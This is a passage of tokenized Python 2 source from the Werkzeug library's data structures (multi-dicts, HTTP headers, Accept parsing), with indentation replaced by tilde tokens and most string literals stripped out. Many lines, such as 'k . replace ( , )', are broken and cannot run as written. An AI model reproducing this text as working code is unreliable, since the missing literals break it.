~~~ return self . items ( multi = True ) \n 
\n 
~~ def __setstate__ ( self , values ) : \n 
~~~ dict . clear ( self ) \n 
for key , value in values : \n 
~~~ self . add ( key , value ) \n 
\n 
~~ ~~ def __getitem__ ( self , key ) : \n 
~~~ if key in self : \n 
~~~ return dict . __getitem__ ( self , key ) [ 0 ] . value \n 
~~ raise self . KeyError ( key ) \n 
\n 
~~ def __setitem__ ( self , key , value ) : \n 
~~~ self . poplist ( key ) \n 
self . add ( key , value ) \n 
\n 
~~ def __delitem__ ( self , key ) : \n 
~~~ self . pop ( key ) \n 
\n 
~~ def iterkeys ( self ) : \n 
~~~ return ( key for key , value in self . iteritems ( ) ) \n 
\n 
~~ def itervalues ( self ) : \n 
~~~ return ( value for key , value in self . iteritems ( ) ) \n 
\n 
~~ def iteritems ( self , multi = False ) : \n 
~~~ ptr = self . _first_bucket \n 
if multi : \n 
~~~ while ptr is not None : \n 
~~~ yield ptr . key , ptr . value \n 
ptr = ptr . next \n 
~~ ~~ else : \n 
~~~ returned_keys = set ( ) \n 
while ptr is not None : \n 
~~~ if ptr . key not in returned_keys : \n 
~~~ returned_keys . add ( ptr . key ) \n 
yield ptr . key , ptr . value \n 
~~ ptr = ptr . next \n 
\n 
~~ ~~ ~~ def iterlists ( self ) : \n 
~~~ returned_keys = set ( ) \n 
ptr = self . _first_bucket \n 
while ptr is not None : \n 
~~~ if ptr . key not in returned_keys : \n 
~~~ yield ptr . key , self . getlist ( ptr . key ) \n 
returned_keys . add ( ptr . key ) \n 
~~ ptr = ptr . next \n 
\n 
~~ ~~ def iterlistvalues ( self ) : \n 
~~~ for key , values in self . iterlists ( ) : \n 
~~~ yield values \n 
\n 
~~ ~~ def add ( self , key , value ) : \n 
~~~ dict . setdefault ( self , key , [ ] ) . append ( _omd_bucket ( self , key , value ) ) \n 
\n 
~~ def getlist ( self , key , type = None ) : \n 
~~~ try : \n 
~~~ rv = dict . __getitem__ ( self , key ) \n 
~~ except KeyError : \n 
~~~ return [ ] \n 
~~ if type is None : \n 
~~~ return [ x . value for x in rv ] \n 
~~ result = [ ] \n 
for item in rv : \n 
~~~ try : \n 
~~~ result . append ( type ( item . value ) ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ ~~ return result \n 
\n 
~~ def setlist ( self , key , new_list ) : \n 
~~~ self . poplist ( key ) \n 
for value in new_list : \n 
~~~ self . add ( key , value ) \n 
\n 
~~ ~~ def setlistdefault ( self , key , default_list = None ) : \n 
~~~ raise TypeError ( \n 
) \n 
\n 
~~ def update ( self , mapping ) : \n 
~~~ for key , value in iter_multi_items ( mapping ) : \n 
~~~ OrderedMultiDict . add ( self , key , value ) \n 
\n 
~~ ~~ def poplist ( self , key ) : \n 
~~~ buckets = dict . pop ( self , key , ( ) ) \n 
for bucket in buckets : \n 
~~~ bucket . unlink ( self ) \n 
~~ return [ x . value for x in buckets ] \n 
\n 
~~ def pop ( self , key , default = _missing ) : \n 
~~~ try : \n 
~~~ buckets = dict . pop ( self , key ) \n 
~~ except KeyError , e : \n 
~~~ if default is not _missing : \n 
~~~ return default \n 
~~ raise self . KeyError ( str ( e ) ) \n 
~~ for bucket in buckets : \n 
~~~ bucket . unlink ( self ) \n 
~~ return buckets [ 0 ] . value \n 
\n 
~~ def popitem ( self ) : \n 
~~~ try : \n 
~~~ key , buckets = dict . popitem ( self ) \n 
~~ except KeyError , e : \n 
~~~ raise self . KeyError ( str ( e ) ) \n 
~~ for bucket in buckets : \n 
~~~ bucket . unlink ( self ) \n 
~~ return key , buckets [ 0 ] . value \n 
\n 
~~ def popitemlist ( self ) : \n 
~~~ try : \n 
~~~ key , buckets = dict . popitem ( self ) \n 
~~ except KeyError , e : \n 
~~~ raise self . KeyError ( str ( e ) ) \n 
~~ for bucket in buckets : \n 
~~~ bucket . unlink ( self ) \n 
~~ return key , [ x . value for x in buckets ] \n 
\n 
\n 
~~ ~~ def _options_header_vkw ( value , kw ) : \n 
~~~ if not kw : \n 
~~~ return value \n 
~~ return dump_options_header ( value , dict ( ( k . replace ( , ) , v ) \n 
for k , v in kw . items ( ) ) ) \n 
\n 
\n 
~~ class Headers ( object ) : \n 
~~~ """An object that stores some headers.  It has a dict-like interface\n    but is ordered and can store the same keys multiple times.\n\n    This data structure is useful if you want a nicer way to handle WSGI\n    headers which are stored as tuples in a list.\n\n    From Werkzeug 0.3 onwards, the :exc:`KeyError` raised by this class is\n    also a subclass of the :class:`~exceptions.BadRequest` HTTP exception\n    and will render a page for a ``400 BAD REQUEST`` if caught in a\n    catch-all for HTTP exceptions.\n\n    Headers is mostly compatible with the Python :class:`wsgiref.headers.Headers`\n    class, with the exception of `__getitem__`.  :mod:`wsgiref` will return\n    `None` for ``headers[\'missing\']``, whereas :class:`Headers` will raise\n    a :class:`KeyError`.\n\n    To create a new :class:`Headers` object pass it a list or dict of headers\n    which are used as default values.  This does not reuse the list passed\n    to the constructor for internal usage.  To create a :class:`Headers`\n    object that uses as internal storage the list or list-like object you\n    can use the :meth:`linked` class method.\n\n    :param defaults: The list of default values for the :class:`Headers`.\n    """ \n 
\n 
# the key error this class raises.  Because of circular dependencies \n 
# with the http exception module this class is created at the end of \n 
# this module. \n 
KeyError = None \n 
\n 
def __init__ ( self , defaults = None , _list = None ) : \n 
~~~ if _list is None : \n 
~~~ _list = [ ] \n 
~~ self . _list = _list \n 
if defaults is not None : \n 
~~~ if isinstance ( defaults , ( list , Headers ) ) : \n 
~~~ self . _list . extend ( defaults ) \n 
~~ else : \n 
~~~ self . extend ( defaults ) \n 
\n 
~~ ~~ ~~ @ classmethod \n 
def linked ( cls , headerlist ) : \n 
~~~ """Create a new :class:`Headers` object that uses the list of headers\n        passed as internal storage:\n\n        >>> headerlist = [(\'Content-Length\', \'40\')]\n        >>> headers = Headers.linked(headerlist)\n        >>> headers[\'Content-Type\'] = \'text/html\'\n        >>> headerlist\n        [(\'Content-Length\', \'40\'), (\'Content-Type\', \'text/html\')]\n\n        :param headerlist: The list of headers the class is linked to.\n        :return: new linked :class:`Headers` object.\n        """ \n 
return cls ( _list = headerlist ) \n 
\n 
~~ def __getitem__ ( self , key , _index_operation = True ) : \n 
~~~ if _index_operation : \n 
~~~ if isinstance ( key , ( int , long ) ) : \n 
~~~ return self . _list [ key ] \n 
~~ elif isinstance ( key , slice ) : \n 
~~~ return self . __class__ ( self . _list [ key ] ) \n 
~~ ~~ ikey = key . lower ( ) \n 
for k , v in self . _list : \n 
~~~ if k . lower ( ) == ikey : \n 
~~~ return v \n 
~~ ~~ raise self . KeyError ( key ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return other . __class__ is self . __class__ and set ( other . _list ) == set ( self . _list ) \n 
\n 
~~ def __ne__ ( self , other ) : \n 
~~~ return not self . __eq__ ( other ) \n 
\n 
~~ def get ( self , key , default = None , type = None ) : \n 
~~~ """Return the default value if the requested data doesn\'t exist.\n        If `type` is provided and is a callable it should convert the value,\n        return it or raise a :exc:`ValueError` if that is not possible.  In\n        this case the function will return the default as if the value was not\n        found:\n\n        >>> d = Headers([(\'Content-Length\', \'42\')])\n        >>> d.get(\'Content-Length\', type=int)\n        42\n\n        If a headers object is bound you must not add unicode strings\n        because no encoding takes place.\n\n        :param key: The key to be looked up.\n        :param default: The default value to be returned if the key can\'t\n                        be looked up.  If not further specified `None` is\n                        returned.\n        :param type: A callable that is used to cast the value in the\n                     :class:`Headers`.  If a :exc:`ValueError` is raised\n                     by this callable the default value is returned.\n        """ \n 
try : \n 
~~~ rv = self . __getitem__ ( key , _index_operation = False ) \n 
~~ except KeyError : \n 
~~~ return default \n 
~~ if type is None : \n 
~~~ return rv \n 
~~ try : \n 
~~~ return type ( rv ) \n 
~~ except ValueError : \n 
~~~ return default \n 
\n 
~~ ~~ def getlist ( self , key , type = None ) : \n 
~~~ """Return the list of items for a given key. If that key is not in the\n        :class:`Headers`, the return value will be an empty list.  Just as\n        :meth:`get` :meth:`getlist` accepts a `type` parameter.  All items will\n        be converted with the callable defined there.\n\n        :param key: The key to be looked up.\n        :param type: A callable that is used to cast the value in the\n                     :class:`Headers`.  If a :exc:`ValueError` is raised\n                     by this callable the value will be removed from the list.\n        :return: a :class:`list` of all the values for the key.\n        """ \n 
ikey = key . lower ( ) \n 
result = [ ] \n 
for k , v in self : \n 
~~~ if k . lower ( ) == ikey : \n 
~~~ if type is not None : \n 
~~~ try : \n 
~~~ v = type ( v ) \n 
~~ except ValueError : \n 
~~~ continue \n 
~~ ~~ result . append ( v ) \n 
~~ ~~ return result \n 
\n 
~~ def get_all ( self , name ) : \n 
~~~ """Return a list of all the values for the named field.\n\n        This method is compatible with the :mod:`wsgiref`\n        :meth:`~wsgiref.headers.Headers.get_all` method.\n        """ \n 
return self . getlist ( name ) \n 
\n 
~~ def iteritems ( self , lower = False ) : \n 
~~~ for key , value in self : \n 
~~~ if lower : \n 
~~~ key = key . lower ( ) \n 
~~ yield key , value \n 
\n 
~~ ~~ def iterkeys ( self , lower = False ) : \n 
~~~ for key , _ in self . iteritems ( lower ) : \n 
~~~ yield key \n 
\n 
~~ ~~ def itervalues ( self ) : \n 
~~~ for _ , value in self . iteritems ( ) : \n 
~~~ yield value \n 
\n 
~~ ~~ def keys ( self , lower = False ) : \n 
~~~ return list ( self . iterkeys ( lower ) ) \n 
\n 
~~ def values ( self ) : \n 
~~~ return list ( self . itervalues ( ) ) \n 
\n 
~~ def items ( self , lower = False ) : \n 
~~~ return list ( self . iteritems ( lower ) ) \n 
\n 
~~ def extend ( self , iterable ) : \n 
~~~ """Extend the headers with a dict or an iterable yielding keys and\n        values.\n        """ \n 
if isinstance ( iterable , dict ) : \n 
~~~ for key , value in iterable . iteritems ( ) : \n 
~~~ if isinstance ( value , ( tuple , list ) ) : \n 
~~~ for v in value : \n 
~~~ self . add ( key , v ) \n 
~~ ~~ else : \n 
~~~ self . add ( key , value ) \n 
~~ ~~ ~~ else : \n 
~~~ for key , value in iterable : \n 
~~~ self . add ( key , value ) \n 
\n 
~~ ~~ ~~ def __delitem__ ( self , key , _index_operation = True ) : \n 
~~~ if _index_operation and isinstance ( key , ( int , long , slice ) ) : \n 
~~~ del self . _list [ key ] \n 
return \n 
~~ key = key . lower ( ) \n 
new = [ ] \n 
for k , v in self . _list : \n 
~~~ if k . lower ( ) != key : \n 
~~~ new . append ( ( k , v ) ) \n 
~~ ~~ self . _list [ : ] = new \n 
\n 
~~ def remove ( self , key ) : \n 
~~~ """Remove a key.\n\n        :param key: The key to be removed.\n        """ \n 
return self . __delitem__ ( key , _index_operation = False ) \n 
\n 
~~ def pop ( self , key = None , default = _missing ) : \n 
~~~ """Removes and returns a key or index.\n\n        :param key: The key to be popped.  If this is an integer the item at\n                    that position is removed, if it\'s a string the value for\n                    that key is.  If the key is omitted or `None` the last\n                    item is removed.\n        :return: an item.\n        """ \n 
if key is None : \n 
~~~ return self . _list . pop ( ) \n 
~~ if isinstance ( key , ( int , long ) ) : \n 
~~~ return self . _list . pop ( key ) \n 
~~ try : \n 
~~~ rv = self [ key ] \n 
self . remove ( key ) \n 
~~ except KeyError : \n 
~~~ if default is not _missing : \n 
~~~ return default \n 
~~ raise \n 
~~ return rv \n 
\n 
~~ def popitem ( self ) : \n 
~~~ """Removes a key or index and returns a (key, value) item.""" \n 
return self . pop ( ) \n 
\n 
~~ def __contains__ ( self , key ) : \n 
~~~ """Check if a key is present.""" \n 
try : \n 
~~~ self . __getitem__ ( key , _index_operation = False ) \n 
~~ except KeyError : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ has_key = __contains__ \n 
\n 
def __iter__ ( self ) : \n 
~~~ """Yield ``(key, value)`` tuples.""" \n 
return iter ( self . _list ) \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _list ) \n 
\n 
~~ def add ( self , _key , _value , ** kw ) : \n 
~~~ """Add a new header tuple to the list.\n\n        Keyword arguments can specify additional parameters for the header\n        value, with underscores converted to dashes::\n\n        >>> d = Headers()\n        >>> d.add(\'Content-Type\', \'text/plain\')\n        >>> d.add(\'Content-Disposition\', \'attachment\', filename=\'foo.png\')\n\n        The keyword argument dumping uses :func:`dump_options_header`\n        behind the scenes.\n\n        .. versionadded:: 0.4.1\n            keyword arguments were added for :mod:`wsgiref` compatibility.\n        """ \n 
self . _list . append ( ( _key , _options_header_vkw ( _value , kw ) ) ) \n 
\n 
~~ def add_header ( self , _key , _value , ** _kw ) : \n 
~~~ """Add a new header tuple to the list.\n\n        An alias for :meth:`add` for compatibility with the :mod:`wsgiref`\n        :meth:`~wsgiref.headers.Headers.add_header` method.\n        """ \n 
self . add ( _key , _value , ** _kw ) \n 
\n 
~~ def clear ( self ) : \n 
~~~ """Clears all headers.""" \n 
del self . _list [ : ] \n 
\n 
~~ def set ( self , _key , _value , ** kw ) : \n 
~~~ """Remove all header tuples for `key` and add a new one.  The newly\n        added key either appears at the end of the list if there was no\n        entry or replaces the first one.\n\n        Keyword arguments can specify additional parameters for the header\n        value, with underscores converted to dashes.  See :meth:`add` for\n        more information.\n\n        .. versionchanged:: 0.6.1\n           :meth:`set` now accepts the same arguments as :meth:`add`.\n\n        :param key: The key to be inserted.\n        :param value: The value to be inserted.\n        """ \n 
lc_key = _key . lower ( ) \n 
_value = _options_header_vkw ( _value , kw ) \n 
for idx , ( old_key , old_value ) in enumerate ( self . _list ) : \n 
~~~ if old_key . lower ( ) == lc_key : \n 
# replace first ocurrence \n 
~~~ self . _list [ idx ] = ( _key , _value ) \n 
break \n 
~~ ~~ else : \n 
~~~ return self . add ( _key , _value ) \n 
~~ self . _list [ idx + 1 : ] = [ ( k , v ) for k , v in self . _list [ idx + 1 : ] \n 
if k . lower ( ) != lc_key ] \n 
\n 
~~ def setdefault ( self , key , value ) : \n 
~~~ """Returns the value for the key if it is in the dict, otherwise it\n        returns `default` and sets that value for `key`.\n\n        :param key: The key to be looked up.\n        :param default: The default value to be returned if the key is not\n                        in the dict.  If not further specified it\'s `None`.\n        """ \n 
if key in self : \n 
~~~ return self [ key ] \n 
~~ self . set ( key , value ) \n 
return value \n 
\n 
~~ def __setitem__ ( self , key , value ) : \n 
~~~ """Like :meth:`set` but also supports index/slice based setting.""" \n 
if isinstance ( key , ( slice , int , long ) ) : \n 
~~~ self . _list [ key ] = value \n 
~~ else : \n 
~~~ self . set ( key , value ) \n 
\n 
~~ ~~ def to_list ( self , charset = ) : \n 
~~~ """Convert the headers into a list and converts the unicode header\n        items to the specified charset.\n\n        :return: list\n        """ \n 
result = [ ] \n 
for k , v in self : \n 
~~~ if isinstance ( v , unicode ) : \n 
~~~ v = v . encode ( charset ) \n 
~~ else : \n 
~~~ v = str ( v ) \n 
~~ result . append ( ( k , v ) ) \n 
~~ return result \n 
\n 
~~ def copy ( self ) : \n 
~~~ return self . __class__ ( self . _list ) \n 
\n 
~~ def __copy__ ( self ) : \n 
~~~ return self . copy ( ) \n 
\n 
~~ def __str__ ( self , charset = ) : \n 
~~~ """Returns formatted headers suitable for HTTP transmission.""" \n 
strs = [ ] \n 
for key , value in self . to_list ( charset ) : \n 
~~~ strs . append ( % ( key , value ) ) \n 
~~ strs . append ( ) \n 
return . join ( strs ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
list ( self ) \n 
) \n 
\n 
\n 
~~ ~~ class ImmutableHeadersMixin ( object ) : \n 
~~~ """Makes a :class:`Headers` immutable.\n\n    .. versionadded:: 0.5\n\n    :private:\n    """ \n 
\n 
def __delitem__ ( self , key ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def __setitem__ ( self , key , value ) : \n 
~~~ is_immutable ( self ) \n 
~~ set = __setitem__ \n 
\n 
def add ( self , item ) : \n 
~~~ is_immutable ( self ) \n 
~~ remove = add_header = add \n 
\n 
def extend ( self , iterable ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def insert ( self , pos , value ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def pop ( self , index = - 1 ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def popitem ( self ) : \n 
~~~ is_immutable ( self ) \n 
\n 
~~ def setdefault ( self , key , default ) : \n 
~~~ is_immutable ( self ) \n 
\n 
\n 
~~ ~~ class EnvironHeaders ( ImmutableHeadersMixin , Headers ) : \n 
~~~ """Read only version of the headers from a WSGI environment.  This\n    provides the same interface as `Headers` and is constructed from\n    a WSGI environment.\n\n    From Werkzeug 0.3 onwards, the `KeyError` raised by this class is also a\n    subclass of the :exc:`~exceptions.BadRequest` HTTP exception and will\n    render a page for a ``400 BAD REQUEST`` if caught in a catch-all for\n    HTTP exceptions.\n    """ \n 
\n 
def __init__ ( self , environ ) : \n 
~~~ self . environ = environ \n 
\n 
~~ @ classmethod \n 
def linked ( cls , environ ) : \n 
~~~ raise TypeError ( \n 
% cls . __name__ ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return self . environ is other . environ \n 
\n 
~~ def __getitem__ ( self , key , _index_operation = False ) : \n 
# _index_operation is a no-op for this class as there is no index but \n 
# used because get() calls it. \n 
~~~ key = key . upper ( ) . replace ( , ) \n 
if key in ( , ) : \n 
~~~ return self . environ [ key ] \n 
~~ return self . environ [ + key ] \n 
\n 
~~ def __len__ ( self ) : \n 
# the iter is necessary because otherwise list calls our \n 
# len which would call list again and so forth. \n 
~~~ return len ( list ( iter ( self ) ) ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ for key , value in self . environ . iteritems ( ) : \n 
~~~ if key . startswith ( ) and key not in ( , ) : \n 
~~~ yield key [ 5 : ] . replace ( , ) . title ( ) , value \n 
~~ elif key in ( , ) : \n 
~~~ yield key . replace ( , ) . title ( ) , value \n 
\n 
~~ ~~ ~~ def copy ( self ) : \n 
~~~ raise TypeError ( % self . __class__ . __name__ ) \n 
\n 
\n 
~~ ~~ class CombinedMultiDict ( ImmutableMultiDictMixin , MultiDict ) : \n 
~~~ """A read only :class:`MultiDict` that you can pass multiple :class:`MultiDict`\n    instances as sequence and it will combine the return values of all wrapped\n    dicts:\n\n    >>> from werkzeug import MultiDict, CombinedMultiDict\n    >>> post = MultiDict([(\'foo\', \'bar\')])\n    >>> get = MultiDict([(\'blub\', \'blah\')])\n    >>> combined = CombinedMultiDict([get, post])\n    >>> combined[\'foo\']\n    \'bar\'\n    >>> combined[\'blub\']\n    \'blah\'\n\n    This works for all read operations and will raise a `TypeError` for\n    methods that usually change data which isn\'t possible.\n\n    From Werkzeug 0.3 onwards, the `KeyError` raised by this class is also a\n    subclass of the :exc:`~exceptions.BadRequest` HTTP exception and will\n    render a page for a ``400 BAD REQUEST`` if caught in a catch-all for HTTP\n    exceptions.\n    """ \n 
\n 
def __reduce_ex__ ( self , protocol ) : \n 
~~~ return type ( self ) , ( self . dicts , ) \n 
\n 
~~ def __init__ ( self , dicts = None ) : \n 
~~~ self . dicts = dicts or [ ] \n 
\n 
~~ @ classmethod \n 
def fromkeys ( cls ) : \n 
~~~ raise TypeError ( % \n 
cls . __name__ ) \n 
\n 
~~ def __getitem__ ( self , key ) : \n 
~~~ for d in self . dicts : \n 
~~~ if key in d : \n 
~~~ return d [ key ] \n 
~~ ~~ raise self . KeyError ( key ) \n 
\n 
~~ def get ( self , key , default = None , type = None ) : \n 
~~~ for d in self . dicts : \n 
~~~ if key in d : \n 
~~~ if type is not None : \n 
~~~ try : \n 
~~~ return type ( d [ key ] ) \n 
~~ except ValueError : \n 
~~~ continue \n 
~~ ~~ return d [ key ] \n 
~~ ~~ return default \n 
\n 
~~ def getlist ( self , key , type = None ) : \n 
~~~ rv = [ ] \n 
for d in self . dicts : \n 
~~~ rv . extend ( d . getlist ( key , type ) ) \n 
~~ return rv \n 
\n 
~~ def keys ( self ) : \n 
~~~ rv = set ( ) \n 
for d in self . dicts : \n 
~~~ rv . update ( d . keys ( ) ) \n 
~~ return list ( rv ) \n 
\n 
~~ def iteritems ( self , multi = False ) : \n 
~~~ found = set ( ) \n 
for d in self . dicts : \n 
~~~ for key , value in d . iteritems ( multi ) : \n 
~~~ if multi : \n 
~~~ yield key , value \n 
~~ elif key not in found : \n 
~~~ found . add ( key ) \n 
yield key , value \n 
\n 
~~ ~~ ~~ ~~ def itervalues ( self ) : \n 
~~~ for key , value in self . iteritems ( ) : \n 
~~~ yield value \n 
\n 
~~ ~~ def values ( self ) : \n 
~~~ return list ( self . itervalues ( ) ) \n 
\n 
~~ def items ( self , multi = False ) : \n 
~~~ return list ( self . iteritems ( multi ) ) \n 
\n 
~~ def iterlists ( self ) : \n 
~~~ rv = { } \n 
for d in self . dicts : \n 
~~~ for key , values in d . iterlists ( ) : \n 
~~~ rv . setdefault ( key , [ ] ) . extend ( values ) \n 
~~ ~~ return rv . iteritems ( ) \n 
\n 
~~ def lists ( self ) : \n 
~~~ return list ( self . iterlists ( ) ) \n 
\n 
~~ def iterlistvalues ( self ) : \n 
~~~ return ( x [ 0 ] for x in self . lists ( ) ) \n 
\n 
~~ def listvalues ( self ) : \n 
~~~ return list ( self . iterlistvalues ( ) ) \n 
\n 
~~ def iterkeys ( self ) : \n 
~~~ return iter ( self . keys ( ) ) \n 
\n 
~~ __iter__ = iterkeys \n 
\n 
def copy ( self ) : \n 
~~~ """Return a shallow copy of this object.""" \n 
return self . __class__ ( self . dicts [ : ] ) \n 
\n 
~~ def to_dict ( self , flat = True ) : \n 
~~~ """Return the contents as regular dict.  If `flat` is `True` the\n        returned dict will only have the first item present, if `flat` is\n        `False` all values will be returned as lists.\n\n        :param flat: If set to `False` the dict returned will have lists\n                     with all the values in it.  Otherwise it will only\n                     contain the first item for each key.\n        :return: a :class:`dict`\n        """ \n 
rv = { } \n 
for d in reversed ( self . dicts ) : \n 
~~~ rv . update ( d . to_dict ( flat ) ) \n 
~~ return rv \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . keys ( ) ) \n 
\n 
~~ def __contains__ ( self , key ) : \n 
~~~ for d in self . dicts : \n 
~~~ if key in d : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ has_key = __contains__ \n 
\n 
def __repr__ ( self ) : \n 
~~~ return % ( self . __class__ . __name__ , self . dicts ) \n 
\n 
\n 
~~ ~~ class FileMultiDict ( MultiDict ) : \n 
~~~ """A special :class:`MultiDict` that has convenience methods to add\n    files to it.  This is used for :class:`EnvironBuilder` and generally\n    useful for unittesting.\n\n    .. versionadded:: 0.5\n    """ \n 
\n 
def add_file ( self , name , file , filename = None , content_type = None ) : \n 
~~~ """Adds a new file to the dict.  `file` can be a file name or\n        a :class:`file`-like or a :class:`FileStorage` object.\n\n        :param name: the name of the field.\n        :param file: a filename or :class:`file`-like object\n        :param filename: an optional filename\n        :param content_type: an optional content type\n        """ \n 
if isinstance ( file , FileStorage ) : \n 
~~~ self [ name ] = file \n 
return \n 
~~ if isinstance ( file , basestring ) : \n 
~~~ if filename is None : \n 
~~~ filename = file \n 
~~ file = open ( file , ) \n 
~~ if filename and content_type is None : \n 
~~~ content_type = mimetypes . guess_type ( filename ) [ 0 ] or \n 
~~ self [ name ] = FileStorage ( file , filename , name , content_type ) \n 
\n 
\n 
~~ ~~ class ImmutableDict ( ImmutableDictMixin , dict ) : \n 
~~~ """An immutable :class:`dict`.\n\n    .. versionadded:: 0.5\n    """ \n 
\n 
__repr__ = _proxy_repr ( dict ) \n 
\n 
def copy ( self ) : \n 
~~~ """Return a shallow mutable copy of this object.  Keep in mind that\n        the standard library\'s :func:`copy` function is a no-op for this class\n        like for any other python immutable type (eg: :class:`tuple`).\n        """ \n 
return dict ( self ) \n 
\n 
~~ def __copy__ ( self ) : \n 
~~~ return self \n 
\n 
\n 
~~ ~~ class ImmutableMultiDict ( ImmutableMultiDictMixin , MultiDict ) : \n 
~~~ """An immutable :class:`MultiDict`.\n\n    .. versionadded:: 0.5\n    """ \n 
\n 
def copy ( self ) : \n 
~~~ """Return a shallow mutable copy of this object.  Keep in mind that\n        the standard library\'s :func:`copy` function is a no-op for this class\n        like for any other python immutable type (eg: :class:`tuple`).\n        """ \n 
return MultiDict ( self ) \n 
\n 
~~ def __copy__ ( self ) : \n 
~~~ return self \n 
\n 
\n 
~~ ~~ class ImmutableOrderedMultiDict ( ImmutableMultiDictMixin , OrderedMultiDict ) : \n 
~~~ """An immutable :class:`OrderedMultiDict`.\n\n    .. versionadded:: 0.6\n    """ \n 
\n 
def copy ( self ) : \n 
~~~ """Return a shallow mutable copy of this object.  Keep in mind that\n        the standard library\'s :func:`copy` function is a no-op for this class\n        like for any other python immutable type (eg: :class:`tuple`).\n        """ \n 
return OrderedMultiDict ( self ) \n 
\n 
~~ def __copy__ ( self ) : \n 
~~~ return self \n 
\n 
\n 
~~ ~~ class Accept ( ImmutableList ) : \n 
~~~ """An :class:`Accept` object is just a list subclass for lists of\n    ``(value, quality)`` tuples.  It is automatically sorted by quality.\n\n    All :class:`Accept` objects work similar to a list but provide extra\n    functionality for working with the data.  Containment checks are\n    normalized to the rules of that header:\n\n    >>> a = CharsetAccept([(\'ISO-8859-1\', 1), (\'utf-8\', 0.7)])\n    >>> a.best\n    \'ISO-8859-1\'\n    >>> \'iso-8859-1\' in a\n    True\n    >>> \'UTF8\' in a\n    True\n    >>> \'utf7\' in a\n    False\n\n    To get the quality for an item you can use normal item lookup:\n\n    >>> print a[\'utf-8\']\n    0.7\n    >>> a[\'utf7\']\n    0\n\n    .. versionchanged:: 0.5\n       :class:`Accept` objects are forced immutable now.\n    """ \n 
\n 
def __init__ ( self , values = ( ) ) : \n 
~~~ if values is None : \n 
~~~ list . __init__ ( self ) \n 
self . provided = False \n 
~~ elif isinstance ( values , Accept ) : \n 
~~~ self . provided = values . provided \n 
list . __init__ ( self , values ) \n 
~~ else : \n 
~~~ self . provided = True \n 
values = [ ( a , b ) for b , a in values ] \n 
values . sort ( ) \n 
values . reverse ( ) \n 
list . __init__ ( self , [ ( a , b ) for b , a in values ] ) \n 
\n 
~~ ~~ def _value_matches ( self , value , item ) : \n 
~~~ """Check if a value matches a given accept item.""" \n 
return item == or item . lower ( ) == value . lower ( ) \n 
\n 
~~ def __getitem__ ( self , key ) : \n 
~~~ """Besides index lookup (getting item n) you can also pass it a string\n        to get the quality for the item.  If the item is not in the list, the\n        returned quality is ``0``.\n        """ \n 
if isinstance ( key , basestring ) : \n 
~~~ return self . quality ( key ) \n 
~~ return list . __getitem__ ( self , key ) \n 
\n 
~~ def quality ( self , key ) : \n 
~~~ """Returns the quality of the key.\n\n        .. versionadded:: 0.6\n           In previous versions you had to use the item-lookup syntax\n           (eg: ``obj[key]`` instead of ``obj.quality(key)``)\n        """ \n 
for item , quality in self : \n 
~~~ if self . _value_matches ( key , item ) : \n 
~~~ return quality \n 
~~ ~~ return 0 \n 
\n 
~~ def __contains__ ( self , value ) : \n 
~~~ for item , quality in self : \n 
~~~ if self . _value_matches ( value , item ) : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return % ( \n 
self . __class__ . __name__ , \n 
. join ( % ( x , y ) for x , y in self ) \n 
) \n 
\n 
~~ def index ( self , key ) : \n 
~~~ """Get the position of an entry or raise :exc:`ValueError`.\n\n        :param key: The key to be looked up.\n\n        .. versionchanged:: 0.5\n           This used to raise :exc:`IndexError`, which was inconsistent\n           with the list API.\n        """ \n 
if isinstance ( key , basestring ) : \n 
~~~ for idx , ( item , quality ) in enumerate ( self ) : \n 
~~~ if self . _value_matches ( key , item ) : \n 
~~~ return idx \n 
~~ ~~ raise ValueError ( key ) \n 
~~ return list . index ( self , key ) \n 
\n 
~~ def find ( self , key ) : \n 
~~~ """Get the position of an entry or return -1.\n\n        :param key: The key to be looked up.\n        """ \n 
try : \n 
~~~ return self . index ( key ) \n 
~~ except ValueError : \n 
~~~ return - 1 \n 
\n 
~~ ~~ def values ( self ) : \n 
~~~ """Return a list of the values, not the qualities.""" \n 
return list ( self . itervalues ( ) ) \n 
\n 
~~ def itervalues ( self ) : \n 
~~~ """Iterate over all values.""" \n 
for item in self : \n 
~~~ yield item [ 0 ] \n 
\n 
~~ ~~ def to_header ( self ) : \n 
~~~ """Convert the header set into an HTTP header string.""" \n 
result = [ ] \n 
for value , quality in self : \n 
~~~ if quality != 1 : \n 
~~~ value = % ( value , quality ) \n 
~~ result . append ( value ) \n 
~~ return . join ( result ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . to_header ( ) \n 
\n 
~~ def best_match ( self , matches , default = None ) : \n 
~~~ """Returns the best match from a list of possible matches based\n        on the quality of the client.  If two items have the same quality,\n        the one is returned that comes first.\n\n        :param matches: a list of matches to check for\n        :param default: the value that is returned if none match\n        """ \n 
best_quality = - 1 \n 
result = default \n 
for server_item in matches : \n 
~~~ for client_item , quality in self : \n 
~~~ if quality <= best_quality : \n 
~~~ break \n 
~~ if self . _value_matches ( client_item , server_item ) : \n 
~~~ best_quality = quality \n 
result = server_item \n 
~~ ~~ ~~ return result \n 
\n 
~~ @ property \n 
def best ( self ) : \n 
~~~ """The best match as value.""" \n 
if self : \n 
~~~ return self [ 0 ] [ 0 ] \n 
\n 
\n 
~~ ~~ ~~ class MIMEAccept ( Accept ) : \n 
~~~ """Like :class:`Accept` but with special methods and behavior for\n    mimetypes.\n    """ \n 
\n 
def _value_matches ( self , value , item ) : \n 
~~~ def _normalize ( x ) : \n 
~~~ x = x . lower ( ) \n 
return x == and ( , ) or x . split ( , 1 ) \n 
\n 
# this is from the application which is trusted.  to avoid developer \n 
# frustration we actually check these for valid values \n 
~~ if not in value : \n 
~~~ raise ValueError ( % value ) \n 
~~ value_type , value_subtype = _normalize ( value ) \n 
if value_type == and value_subtype != : \n 
